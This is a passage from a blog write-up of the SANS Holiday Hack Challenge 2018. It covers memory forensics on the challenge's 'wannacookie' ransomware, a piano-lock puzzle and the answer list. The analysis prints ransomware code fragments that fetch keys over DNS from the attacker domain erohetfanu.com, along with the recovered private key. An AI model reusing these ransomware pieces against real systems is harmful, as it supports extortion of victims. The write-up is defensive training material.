* The key is hex-encoded in :code:`$h_k`, which is then hashed using SHA1 and
  stored in :code:`$k_h`.
* The AES key :code:`$b_k` is encrypted using the public key :code:`$p_k`. The
  result is stored in :code:`$p_k_e_k`.
* The encrypted key, :code:`$p_k_e_k` is sent to the DNS server, which gives
  a victim id, :code:`$c_id`.
* The current date in UTC is stored in :code:`$d_t`.
* A list of all :code:`*.elfdb` files is generated, and then encrypted using
  :code:`$b_k`.
* The variables :code:`$b_k` and :code:`$h_k` are cleared using
  :code:`Clear-Variable`. (The variable :code:`$key`, which holds the value of
  :code:`$b_k` in :code:`e_d_file` is also cleared).
* The malware sets up an HTTP listener on :code:`127.0.0.1:8080`, which
  displays an HTML ransom message, downloaded from the DNS server, using the
  code :code:`g_o_dns (A2H "source.min.html")`. The HTTP listener handles
  decryption requests: when the victim pays the ransom, the decryption key is
  given to them. They can then enter them in the HTTP listener, which will
  compare this key's SHA1 sum to the one it has in memory in the variable
  :code:`$k_h`. If they match, the files are decrypted.

All the dead ends, yay!
.......................

Alright, knowing this, how can we try and recover Alabaster's passwords? Here's
a list of the things that I tried and that **don't work**, but still took a
whole lot of time to test (and then had the audacity of **not being the right
solutions, damn them!**). Again, if you just directly want the right solution,
you can `jump to it <#id4>`__.

I first thought that maybe the keys weren't correctly cleared in the memory
dump and that I could recover them, using tools such as :code:`aes-finder`,
:code:`aeskeyfind`, :code:`findaes`, etc. But these tools did not find
anything.

I then thought that maybe the `Volatility framework
<https://tools.kali.org/forensics/volatility>`__ could help. But it doesn't
support the Mini DuMP format used in the dump. So, another deadend.

I then thought thay maybe the password file or the encryption key could be
found in cleartext using :code:`binwalk`. But it only returned what I think
were many false-positives, and no password file or encryption key.

On to my next deadend, which stole most of my time. It's common for ransomware
to generate weak encryption keys, because of unproper random initialization.
Here's an `example
<https://blog.malwarebytes.com/threat-analysis/2018/03/encryption-101-how-to-break-encryption/>`__.
If you remember, the malware generates the AES key using the PowerShell
function :code:`Get-Random`, without any seed. I did a little research on this
function, and found some `resources online <https://www.reddit.com/r/Iota/comments/6v9mj6/psa_nearly_all_powershell_generated_seeds_are/>`__
that suggested that maybe the randomness produced by :code:`Get-Random` was
not cryptographically-secure. I then read `Microsoft's documentation of the
function <https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-random?view=powershell-6>`__,
which states (emphasis mine):

    **-SetSeed**

    Specifies a seed value for the random number generator. This seed value is
    used for the current command and for all subsequent Get-Random commands in
    the current session until you use SetSeed again or close the session. You
    cannot reset the seed to its default, clock-based value.

    The SetSeed parameter is not required. **By default, Get-Random uses the
    system clock to generate a seed value**. Because SetSeed results in
    non-random behavior, it is typically used only when trying to reproduce
    behavior, such as when debugging or analyzing a script that includes
    Get-Random commands.

I thought I had my ticket with this. I thought that if I found at what time the
ransomware was launched, I could use this time as a seed to regenerate the
encryption key. Luckily, we have several ways to find around which time the
ransomware was launched. First, it's in the metadata of the dump file:

.. code-block:: console

    $ file powershell.exe_181109_104716.dmp 
    powershell.exe_181109_104716.dmp: Mini DuMP crash report, 19 streams, Fri Nov  9 15:47:39 2018, 0x61826 type

Then, if you remember, the current date was stored in a variable :code:`$d_t`
in the ransomware. This date was displayed in the HTML listener, next to the
payment status:

.. code-block:: console

    $ grep -a UNPAID powershell.exe_181109_104716.dmp 
    �B_��RE_��_E_ ����OUNPAID|               4739626449686a334d36|Friday, November 09, 2018 3:25:34 PM
    [snip]

So, the ransomware was launched on Friday, November 09, 2018, around 3:00 PM.
Now that I knew the time of launch, I could try to regenerate the AES key
using :code:`Get-Random`. Or so I thought... No matther how I initialized the
key, I wasn't able to obtain reproductible results using :code:`Get-Random`.

I then saw online that maybe :code:`Get-Random` is not seeded with the system
date, but with the system uptime, using :code:`TickCounts`. But there again, I
wasn't able to obtain reproductible results. I did some more digging, and
`several <https://stackoverflow.com/questions/45135091/what-prng-does-get-random-in-powershell-5-1-use>`__
StackOverflow `posts <https://stackoverflow.com/questions/34331541/what-is-the-default-seed-for-powershell-get-random-cmdlet>`__
indicated that the seed initialization is trickier that I thought. As suggested
by one of these posts, I took a look at PowerShell's source code on `GitHub
<https://github.com/PowerShell/PowerShell/blob/master/src/Microsoft.PowerShell.Commands.Utility/commands/utility/GetRandomCommand.cs>`__.

There, you can see that if you initialize the seed using :code:`-SetSeed`, you
can see that the random generator used is :code:`System.Random`. If you don't
initialize the seed, the random generator used is
:code:`System.Security.Cryptography.RandomNumberGenerator`. However, `this
function <https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.randomnumbergenerator?view=netframework-4.7.2>`__
does not seem to have any weakness in its seed initialization process.

After having wasted three days on this track, I gave up and asked for my
coworkers' help. While most of them were busy and made me understand in
colorful phrasing that they didn't have the time to help me, one of them,
`imaibou <https://github.com/imaibou>`__, had some time to take a look.

He ran a deweaponized version of the ransomware (where the encryption was
commented out) and then produced a dump of the PowerShell process. He then
mentioned to me that he was able to find out his AES key (that he had printed
out) in the memory dump of his process. Ha! I was right from the start: the
key is not properly cleared from the memory. Or so I thought, yet again...
We tried searching for the keys in Alabater's memory dump in every imaginable
format:

* In raw hexadecimal (:code:`\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX`).
* In UTF16-LE encoded hexadecimal (:code:`\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00\xXX\x00`).
* In printable hex representation (:code:`XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`)
* In UTF16-LE encoded printable hex representation (:code:`XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00XX\x00`)
* In oh-so-many other formats...

But no luck. Even though we managed to find our key in our home-made memory
dump, we couldn't find the key in Alabaster's dump. Even our boss, Christophe,
took time out of his schedule to lend a hand. but even his security super
powers didn't manage to take us out of this slump.

Out of ideas, ashamed, and tired, we went and looked at the hints for this
question. Here's what we were given:

    :code:`wannacookie.min.ps1`? I wonder if there is a non-minified version?
    If so, it may be easier to read and give us more information and maybe
    source comments?

    Whoa, `Chris Davis' talk <http://www.youtube.com/watch?v=wd12XRq2DNk>`__ on
    PowerShell malware is crazy pants! You should check it out!

    Pulling strings from a memory dump using the linux :code:`strings` command
    requires you specify the :code:`-e` option with the specific format
    required by the OS and processor. Of course, you could also use
    `powerdump <https://github.com/chrisjd20/power_dump>`__.

I didn't understand the reference to :code:`wannacookie.min.ps1`, since I
hadn't seen this filename anywhere (but more on that later).

I then felt stupid: I had forgotten that KringleCon is initially a security
conference. I then proceeded to watch Chris Davis' talk on PowerShell malware
memory analysis, where he presents his tool :code:`power_dump`, which can be
used to analyze memory dump of PowerShell processes, and extract variables.

I loaded up :code:`power_dump`, sighing that I finally will be able to answer
this question. I used the tool to search for 32-byte long hexadecimal
representation:

.. code-block:: text
    :hl_lines: 17 20 23 26 29

    ================ Filters ================
    1| MATCHES  bool(re.search(r"^[0-9a-fA-F]+$",variable_values)) 
    2| LENGTH  len(variable_values) == 32

    [i] 5 powershell Variable Values found!
    ============== Search/Dump PS Variable Values ===================================
    COMMAND        |     ARGUMENT                | Explanation                     
    ===============|=============================|=================================
    print          | print [all|num]             | print specific or all Variables
    dump           | dump [all|num]              | dump specific or all Variables
    contains       | contains [ascii_string]     | Variable Values must contain string
    matches        | matches "[python_regex]"    | match python regex inside quotes
    len            | len [>|<|>=|<=|==] [bt_size]| Variables length >,<,=,>=,<= size  
    clear          | clear [all|num]             | clear all or specific filter num
    ===============================================================================
    : print all
    033ecb2bc07a4d43b5ef94ed5a35d280
    Variable Values #1 above ^
    Type any key to go back and just Enter to Continue...
    cf522b78d86c486691226b40aa69e95c
    Variable Values #2 above ^
    Type any key to go back and just Enter to Continue...
    9e210fe47d09416682b841769c78b8a3
    Variable Values #3 above ^
    Type any key to go back and just Enter to Continue...
    4ec4f0187cb04f4cb6973460dfe252df
    Variable Values #4 above ^
    Type any key to go back and just Enter to Continue...
    27c87ef9bbda4f709f6b4002fa4af63c
    Variable Values #5 above ^
    Type any key to go back and just Enter to Continue...

"Huh", I thought, "these keys look familiar". That's because I had already
found them in the memory dump using :code:`strings`! And I know that they're
not the correct keys!

The right solution
..................

Despair fell on me again. Now I was freshly out of ideas, again! I then turned
to my last resort: the KringleCon chat. People told me that maybe I shouldn't
try to look directly for the key in memory, but to another form. I also noticed
that people were talking a lot about public/private key encryption.

And then it clicked: I should look for the encrypted key in memory, that is
the value of the :code:`$p_k_e_k` variable. But even if I find this value, how
will I decrypt it without the private key? My colleague `imaibou
<https://github.com/imaibou>`__ mentioned that he tried to factor the public
key using `weak factors <https://eprint.iacr.org/2015/398.pdf>`__, but to no
avail. I saw in the KringleCon chat that some people had managed to find the
ransomware's private key.

And then it cliked again! I thought back to the first hint, the one I didn't
understand, talking about :code:`wannacookie.min.ps1`. Remember the hash we
used for our Snort rule? Its value is
:code:`77616E6E61636F6F6B69652E6D696E2E707331`. What happens if we decode this
hex value?

.. code-block:: console

    $ echo 77616E6E61636F6F6B69652E6D696E2E707331 | xxd -r -p
    wannacookie.min.ps1

We can encode some file names in hexadecimal, and then download them from the
DNS server, using the :code:`g_o_dns` PowerShell function. For example, let's
try to download an unminified version of the malware. We can kind of guess
that the filename will be :code:`wannacookie.ps1`. Let's encode this, and
download it with :code:`g_o_dns`:

.. code-block:: console

    $ echo -n wannacookie.ps1 | xxd -p
    77616e6e61636f6f6b69652e707331

.. code-block:: ps1con

    PS C:\> g_o_dns("77616e6e61636f6f6b69652e707331") > .\wannacookie.ps1
    PS C:\> Get-Content .\wannacookie.ps1
    $functions = {
        function Enc_Dec-File($key, $File, $enc_it) {
            [byte[]]$key = $key
            $Suffix = "`.wannacookie"
            [System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography')
            [System.Int32]$KeySize = $key.Length*8
            $AESP = New-Object 'System.Security.Cryptography.AesManaged'
    [...]
    function wannacookie {
        $S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000"
        if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {return}
        if ($(netstat -ano | Select-String "127.0.0.1:8080").length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne "KRINGLECASTLE") {return}
        $pub_key = [System.Convert]::FromBase64String($(get_over_dns("7365727665722E637274") ) )
        $Byte_key = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join ''))  | ? {$_ -ne 0x00})
        $Hex_key = $(B2H $Byte_key)
        $Key_Hash = $(Sha1 $Hex_key)
    [...]

Awesome, we can download file from the DNS server. Now, let's go back to the
malware's source code. How did it download the public key?

.. code-block:: powershell

    $p_k = [System.Convert]::FromBase64String($(g_o_dns("7365727665722E637274") ) );

Let's decode the :code:`7365727665722E637274` string:

.. code-block:: console

    $ echo 7365727665722E637274 | xxd -p -r
    server.crt

So, apparently, the public key was in a file called :code:`server.crt`. What's
the name of the file containing the private key? Let's try something simple,
such as :code:`server.key`.

.. code-block:: console

    $ echo -n server.key | xxd -p   
    7365727665722e6b6579

.. code-block:: ps1con

    PS C:\> g_o_dns("7365727665722e6b6579")
    -----BEGIN PRIVATE KEY-----
    MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDEiNzZVUbXCbMG
    L4sM2UtilR4seEZli2CMoDJ73qHql+tSpwtK9y4L6znLDLWSA6uvH+lmHhhep9ui
    W3vvHYCq+Ma5EljBrvwQy0e2Cr/qeNBrdMtQs9KkxMJAz0fRJYXvtWANFJF5A+Nq
    jI+jdMVtL8+PVOGWp1PA8DSW7i+9eLkqPbNDxCfFhAGGlHEU+cH0CTob0SB5Hk0S
    TPUKKJVc3fsD8/t60yJThCw4GKkRwG8vqcQCgAGVQeLNYJMEFv0+WHAt2WxjWTu3
    HnAfMPsiEnk/y12SwHOCtaNjFR8Gt512D7idFVW4p5sT0mrrMiYJ+7x6VeMIkrw4
    tk/1ZlYNAgMBAAECggEAHdIGcJOX5Bj8qPudxZ1S6uplYan+RHoZdDz6bAEj4Eyc
    0DW4aO+IdRaD9mM/SaB09GWLLIt0dyhRExl+fJGlbEvDG2HFRd4fMQ0nHGAVLqaW
    OTfHgb9HPuj78ImDBCEFaZHDuThdulb0sr4RLWQScLbIb58Ze5p4AtZvpFcPt1fN
    6YqS/y0i5VEFROWuldMbEJN1x+xeiJp8uIs5KoL9KH1njZcEgZVQpLXzrsjKr67U
    3nYMKDemGjHanYVkF1pzv/rardUnS8h6q6JGyzV91PpLE2I0LY+tGopKmuTUzVOm
    Vf7sl5LMwEss1g3x8gOh215Ops9Y9zhSfJhzBktYAQKBgQDl+w+KfSb3qZREVvs9
    uGmaIcj6Nzdzr+7EBOWZumjy5WWPrSe0S6Ld4lTcFdaXolUEHkE0E0j7H8M+dKG2
    Emz3zaJNiAIX89UcvelrXTV00k+kMYItvHWchdiH64EOjsWrc8co9WNgK1XlLQtG
    4iBpErVctbOcjJlzv1zXgUiyTQKBgQDaxRoQolzgjElDG/T3VsC81jO6jdatRpXB
    0URM8/4MB/vRAL8LB834ZKhnSNyzgh9N5G9/TAB9qJJ+4RYlUUOVIhK+8t863498
    /P4sKNlPQio4Ld3lfnT92xpZU1hYfyRPQ29rcim2c173KDMPcO6gXTezDCa1h64Q
    8iskC4iSwQKBgQCvwq3f40HyqNE9YVRlmRhryUI1qBli+qP5ftySHhqy94okwerE
    KcHw3VaJVM9J17Atk4m1aL+v3Fh01OH5qh9JSwitRDKFZ74JV0Ka4QNHoqtnCsc4
    eP1RgCE5z0w0efyrybH9pXwrNTNSEJi7tXmbk8azcdIw5GsqQKeNs6qBSQKBgH1v
    sC9DeS+DIGqrN/0tr9tWklhwBVxa8XktDRV2fP7XAQroe6HOesnmpSx7eZgvjtVx
    moCJympCYqT/WFxTSQXUgJ0d0uMF1lcbFH2relZYoK6PlgCFTn1TyLrY7/nmBKKy
    DsuzrLkhU50xXn2HCjvG1y4BVJyXTDYJNLU5K7jBAoGBAMMxIo7+9otN8hWxnqe4
    Ie0RAqOWkBvZPQ7mEDeRC5hRhfCjn9w6G+2+/7dGlKiOTC3Qn3wz8QoG4v5xAqXE
    JKBn972KvO0eQ5niYehG4yBaImHH+h6NVBlFd0GJ5VhzaBJyoOk+KnOnvVYbrGBq
    UdrzXvSwyFuuIqBlkHnWSIeC
    -----END PRIVATE KEY-----

Awesome! We now have the ransomware's private key! We can use it to recover our
AES key. But first, we must find our encrypted AES key in our memory dump. To
know what we're looking for, let's encrypt a fake AES key using the
ransomware's source code and public key, to see the result:

.. code-block:: ps1con

    PS C:\> $p_k = [System.Convert]::FromBase64String($(g_o_dns("7365727665722E637274")));
    PS C:\> $b_k = @(1..16)
    PS C:\> p_k_e $b_k $p_k
    b9554cb7ea6ff46c689d90a8d42fc9b9692552d42b6ca34c8aa4593602e7d0cbef88d5dda935960c4ab4e92d789e290c58bf1a280ca9bbf502a8c43ad0eba242e2c8000d5e81fb73aa381dff97cf58c51bb1a49d3a54c15a4de84cf3029cc9dba7364ccc78e95058480f25719cb6aa7763469175dadd031113f6f64ba461adb5303a5c65cb6260bf1ca24eed4e251a99f4219cee6f35aa166e29c3215381bfecd0f9b3eded6acfeeaf8695f55b8e3741c8ca365f8a81560fb92e1bddb11b1bb19399b0a377dd5226e0930ea812c8c151382a7508aab93b4a9f19535fa2808b23520f249bb63d747f3e49a4b279a3cafcadba4daa2175b35d8841def66a2abfd4

Alright, the encrypted key we're looking for seems to be a 512-byte long hex
representation. Let's use :code:`strings` and :code:`grep` to look for
something like this in the memory dump:

.. code-block:: console

    $ strings -e b powershell.exe_181109_104716.dmp| grep -E '^[0-9a-f]{512}$'
    3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971

We got a unique match! This may be our luck. Let's hex-decode this string, and
try to decrypt it. To decrypt it, I'll use :code:`openssl` to generate a full
certificate, with combined public and private keys in a single file. The
resulting :code:`.pfx` file won't have any passphrase:

*NB: Before that, make sure that you add* :code:`-----BEGIN CERTIFICATE-----`
*and* :code:`-----END CERTIFICATE-----` *in the public key file.*

.. code-block:: console

    $ strings -e b powershell.exe_181109_104716.dmp| grep -E '^[0-9a-f]{512}$' | xxd -p -r > encrypted_aes_key.raw
    $ openssl pkcs12 -export -in ./public.cer -inkey ./private.key -out wannacookie_cert.pfx
    Enter Export Password:
    Verifying - Enter Export Password:

Now let's decrypt this key:

.. code-block:: ps1con
    :hl_lines: 4

    PS C:\> $wannacookie_cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2("C:\path\to\wannacookie_cert.pfx")
    PS C:\> $key_bytes = [System.IO.File]::ReadAllBytes("C:\path\to\encrypted_aes_key.raw")
    PS C:\> B2H $($wannacookie_cert.PrivateKey.Decrypt($key_bytes, $true))
    fbcfc121915d99cc20a3d3d5d84f8308

We have our decrypted key (well, *a* decrypted key). Let's see if it works.
Since I loath PowerShell's syntax, I'm using a little Python script to decrypt
Alabaster's password database:

.. code-block:: python

    #!/usr/bin/env python

    import sys
    import struct
    from Crypto.Cipher import AES

    def main():
        if len(sys.argv) != 3:
            print 'Usage: {} <file_to_decrypt> <key>'.format(sys.argv[0])
            sys.exit(1)

        encrypted_file = sys.argv[1]
        decrypted_file = encrypted_file.replace('.wannacookie', '')

        with open(encrypted_file, 'rb') as f:
            # We read 4 bytes to get the IV's size
            iv_size = struct.unpack('<i', f.read(4))[0]

            # We read the IV
            iv = f.read(iv_size)

            # We read the rest of the file
            encrypted_content = f.read()

        key = sys.argv[2].decode('hex')

        aes = AES.new(key, AES.MODE_CBC, iv)
        decrypted_content = aes.decrypt(encrypted_content)
        with open(decrypted_file, 'wb') as f:
            f.write(decrypted_content)

    if __name__ == '__main__':
        main()

.. code-block:: console

    $ ./decrypt_wannacookie.py ./alabaster_passwords.elfdb.wannacookie fbcfc121915d99cc20a3d3d5d84f8308
    $ file alabaster_passwords.elfdb
    alabaster_passwords.elfdb: SQLite 3.x database, last written using SQLite version 3015002

**Finally!** We have our decrypted file:

.. code-block:: console
    :hl_lines: 11

    $ sqlite3 ./alabaster_passwords.elfdb
    SQLite version 3.22.0 2018-01-22 18:45:57
    Enter ".help" for usage hints.
    sqlite> .schema
    CREATE TABLE IF NOT EXISTS "passwords" (
        `name`    TEXT NOT NULL,
        `password`    TEXT NOT NULL,
        `usedfor`    TEXT NOT NULL
    );
    sqlite> select * from passwords where usedfor="vault";
    alabaster.snowball|ED#ED#EED#EF#G#F#G#ABA#BA#B|vault

We finally find the final password: :code:`ED#ED#EED#EF#G#F#G#ABA#BA#B`.

Who Is Behind It All?
~~~~~~~~~~~~~~~~~~~~~

Using Alabaster's password, we can now try to enter Santa's vault. We just have
to play the tune on the piano lock and...

.. image:: /images/sans-christmas-challenge-2018/pianolock_fail.png
    :alt: pianolock_fail.png
    :align: center

Damn! This isn't the right key! If you remember Holy Evergreen's document on
music transposition, Alabster likes song in the key of D major. Now, we just
have to find what's the key of the original song.

We can use the following rules of thumb:

* What's the first note? E.
* What's the most common note? E.
* What's the last note? B.

The two first rules hint that this is in the key of E. Indeed, every note in
the password fit in the `E major scale <https://en.wikipedia.org/wiki/E_major>`__
(well, except for the borrowed A♯).

*Note: this is by no means a fool-proof method to identify the key of a song,
but it can be handy.*

So, the song is in E major, and we want it in D major. D is a whole step below
E, so we must take every note in the song, and move them down one whole step.
This gives us :code:`DC#DC#DDC#DEF#EF#GAG#AG#A`. We can now play this on the
piano lock:

.. image:: /images/sans-christmas-challenge-2018/pianolock_success.png
    :alt: pianolock_success.png
    :align: center

This gives us the message :code:`You have unlocked Santa's vault!`.

Success! We now have access to Santa's vault. Now, to find who is behind it
all. We go inside the vault and we find... Hans? And Santa?!

.. image:: /images/sans-christmas-challenge-2018/alabaster.png
    :alt: alabaster.png
    :align: center

*Alabaster says*

    I'm seriously impressed by your security skills!

    How could I forget that I used Rachmaninoff as my musical password?

    Of course I transposed it it before I entered it into my database for extra
    security.
    
    *Alabaster steps aside, revealing two familiar, smiling faces.*

.. image:: /images/sans-christmas-challenge-2018/hans_smile.png
    :alt: hans_smile.png
    :align: center

*Hans says*

    It’s a pleasure to see you again.

    Congratulations.

.. image:: /images/sans-christmas-challenge-2018/santa.png
    :alt: santa.png
    :align: center

*Santa says*

    You DID IT! You completed the hardest challenge. You see, Hans and the
    soldiers work for ME. I had to test you. And you passed the test!

    You WON! Won what, you ask? Well, the jackpot, my dear! The grand and
    glorious jackpot!

    You see, I finally found you!

    I came up with the idea of KringleCon to find someone like you who could
    help me defend the North Pole against even the craftiest attackers.

    That’s why we had so many different challenges this year.

    We needed to find someone with skills all across the spectrum.

    I asked my friend Hans to play the role of the bad guy to see if you could
    solve all those challenges and thwart the plot we devised.

    And you did!

    Oh, and those brutish toy soldiers? They are really just some of my elves
    in disguise.

    See what happens when they take off those hats?

.. image:: /images/sans-christmas-challenge-2018/toy_soldier_green_no_hat.png
    :alt: toy_soldier_green_no_hat.png
    :align: center

.. image:: /images/sans-christmas-challenge-2018/santa.png
    :alt: santa.png
    :align: center

*Santa continues*

    Based on your victory… next year, I’m going to ask for your help in
    defending my whole operation from evil bad guys.

    And welcome to my vault room. Where's my treasure? Well, my treasure is
    Christmas joy and good will.

    You did such a GREAT job! And remember what happened to the people who
    suddenly got everything they ever wanted?

    They lived happily ever after.

Thank you, Santa!

.. image:: /images/sans-christmas-challenge-2018/santas_vault_selfie.png
    :alt: santas_vault_selfie.png
    :align: center

Answers to the questions
~~~~~~~~~~~~~~~~~~~~~~~~

Let's answer the questions:

1. What phrase is revealed when you answer all of the `KringleCon Holiday Hack
   History questions <https://www.holidayhackchallenge.com/2018/challenges/osint_challenge_windows.html>`__?

The phrase revealed is :code:`Happy Trails`.

2. Who submitted (First Last) the rejected talk titled **Data Loss for Rainbow
   Teams: A Path in the Darkness**?

The talk was submitted by John McClane.

3. The KringleCon Speaker Unpreparedness room is a place for frantic speakers
   to furiously complete their presentations. The room is protected by a door
   passcode. Upon entering the correct passcode, what message is presented to
   the speaker?

The message is :code:`Welcome unprepared speaker!`.

4. Retrieve the encrypted ZIP file from the North Pole Git repository. What is
   the password to open this file?

The password is :code:`Yippee-ki-yay`, motherf*cker.

5. Using the data set contained in this `SANS Slingshot Linux image
   <https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova>`__,
   find a reliable path from a Kerberoastable user to the Domain Admins group.
   What’s the user’s logon name (in username@domain.tld format)?

The user is :code:`LDUBEJ00320@AD.KRINGLECASTLE.COM`.

6. Bypass the authentication mechanism associated with the room near Pepper
   Minstix. `A sample employee badge is available
   <https://www.holidayhackchallenge.com/2018/challenges/alabaster_badge.jpg>`__.
   What is the access control number revealed by the `door authentication
   panel <https://scanomatic.kringlecastle.com/index.html>`__?

The access control number is :code:`19880715`.

7. Santa uses an Elf Resources website to look for talented information
   security professionals. `Gain access to the website
   <https://careers.kringlecastle.com/>`__ and fetch the document
   :code:`C:\candidate_evaluation.docx`. Which terrorist organization is
   secretly supported by the job applicant whose name begins with "K"?

The terrorist organization is :code:`Fancy Beaver`.

8. Santa has introduced a `web-based packet capture and analysis tool
   <https://packalyzer.kringlecastle.com/>`__ to support the elves and their
   information security work. Using the system, access and decrypt HTTP/2
   network activity. What is the name of the song described in the document
   sent from Holly Evergreen to Alabaster Snowball?

The song is :code:`Mary Had a Little Lamb`.

9. Alabaster Snowball is in dire need of your help. Santa's file server has
   been hit with malware. Help Alabaster Snowball deal with the malware on
   Santa's server by completing several tasks. To start, assist Alabaster by
   accessing (clicking) the snort terminal below. Then create a rule that will
   catch all new infections. What is the success message displayed by the Snort
   terminal?

The success message is :code:`[+] Congratulation! Snort is alerting on all
ransomware and only the ransomware!`.

10. After completing the prior question, Alabaster gives you a document he
    suspects downloads the malware. What is the domain name the malware in the
    document downloads from?

The domain name is :code:`erohetfanu.com`.

11. Analyze the full malware source code to find a kill-switch and activate it
    at the North Pole's domain registrar `HoHoHo Daddy
    <https://hohohodaddy.kringlecastle.com/index.html>`__. What is the full
    sentence text that appears on the domain registration success message
    (bottom sentence)?

The sentence is :code:`Successfully registered yippeekiyaa.aaay!`.

12. After activating the kill-switch domain in the last question, Alabaster
    gives you a `zip file <https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip>`__
    with a memory dump and encrypted password database. Use these files to
    decrypt Alabaster's password database. What is the password entered in the
    database for the Vault entry?

The password in the database is :code:`ED#ED#EED#EF#G#F#G#ABA#BA#B`.

13. Use what you have learned from previous challenges to open the `door to
    Santa's vault <https://pianolockn.kringlecastle.com/>`__. What message do
    you get when you unlock the door?

The message is :code:`You have unlocked Santa's vault!`.

14. Who was the mastermind behind the whole KringleCon plan?

The mastermind was Santa all along!

Conclusion
~~~~~~~~~~

Whew! Well, this sure was challenging. For some of these questions, I think I
was too focused on one possible answer, and when I saw it wasn't the correct
one, I felt out of ideas. For example, I shouldn't have missed the hex encoding
of the file names in the ransomware source code, but I was distracted by the
unsafe randomness!

Which brings the question, is :code:`Get-Random` actually cryptographically
safe is used without a seed? This seems to contradicts what I've found during
my research, but I don't have the answer 🤷‍♂️.

Our next question is, what does :code:`erohetfanu` (the domain used for the
ransomware DNS server) mean? I asked one of my anagram-enthusiast friend what
it could mean, and he gave me the following answers:

* Four ethane
* A fun hetero *(I like this one)*
* Ah fourteen
* Unearth foe
* Fear the UNO *(Hmmm, what?)*
* One fur heat
* Eat, fun hero *(Also like this one)*
* A foe hunter *(Probably this one, though)*

And finally `does this really qualify as a **Christmas** challenge <https://nerdist.com/die-hard-christmas-movie/>`__? 😉

Once again, congratulations to the SANS team for a well executed challenge. I
enjoyed the fact that it allowed people to use real-world professional tools
and techniques (like :code:`BloodHound`, and Kerberoast). I also really liked
the malware analysis portion, even if I was a litle bit frustrated with myself!
It's not something that we usually do in our day-to-day work and I enjoyed the
exercise.

See you next year!

Appendix: Chocolate Chip Cookie Recipe
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

.. image:: /images/sans-christmas-challenge-2018/chocolate_chip_cookie_recipe.jpg
    :alt: chocolate_chip_cookie_recipe.jpg
    :align: center

**PREHEAT** oven to 375° F.

**COMBINE** flour, baking soda and salt in small bowl. Beat butter, granulated
sugar, brown sugar and vanilla extract in large mixer bowl until creamy. Add
eggs, one at a time, beating well after each addition. Gradually beat in flour
mixture. Stir in morsels and nuts. Drop by rounded tablespoon onto ungreased
baking sheets. 

**BAKE** for 9 to 11 minutes or until golden brown. Cool on baking sheets for
2 minutes; remove to wire racks to cool completely. 

**PAN COOKIE VARIATION:** Preheat oven to 350° F. Grease 15 x 10-inch
jelly-roll pan. Prepare dough as above. Spread into prepared pan. Bake for 20
to 25 minutes or until golden brown. Cool in pan on wire rack. Makes 4 dozen
bars. 

**SLICE AND BAKE COOKIE VARIATION: PREPARE** dough as above. Divide in half;
wrap in waxed paper. Refrigerate for 1 hour or until firm. Shape each half into
15-inch log; wrap in wax paper.  Refrigerate for 30 minutes.\* Preheat oven to
375° F. Cut into 1/2-inch-thick slices; place on ungreased baking sheets. Bake
for 8 to 10 minutes or until golden brown. Cool on baking sheets for 2 minutes;
remove to wire racks to cool completely. Makes about 5 dozen cookies. 

*\* May be stored in refrigerator for up to 1 week or in freezer for up to 8
weeks.*

**FOR HIGH ALTITUDE BAKING (5,200 feet):** Increase flour to 2 1/2 cups. Add 2
teaspoons water with flour and reduce both granulated sugar and brown sugar to
2/3 cup each. Bake drop cookies for 8 to 10 minutes and pan cookie for 17 to 19
minutes.

